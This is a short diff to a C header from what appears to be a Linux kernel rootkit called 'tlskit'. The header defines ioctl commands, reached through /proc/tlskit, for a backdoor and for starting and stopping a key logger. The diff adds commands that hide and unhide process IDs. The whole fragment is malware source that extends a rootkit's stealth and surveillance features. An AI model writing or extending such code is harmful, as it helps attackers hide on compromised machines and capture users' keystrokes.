@@ -15,6 +15,8 @@
 #define RKCTL_BACKDOOR  _IO('@', 0x03)
 #define RKCTL_START_KEY_LOGGER _IOW('@', 0x04, void *)
 #define RKCTL_STOP_KEY_LOGGER _IO('@', 0x05)
+#define RKCTL_HIDE_PID_ADD _IOW('@', 0x6, pid_t)
+#define RKCTL_HIDE_PID_RM _IOW('@', 0x7, pid_t)
 
 #define PROC_ENTRY_NAME "tlskit"
 #define IOCTL_FILE_PATH "/proc/tlskit"
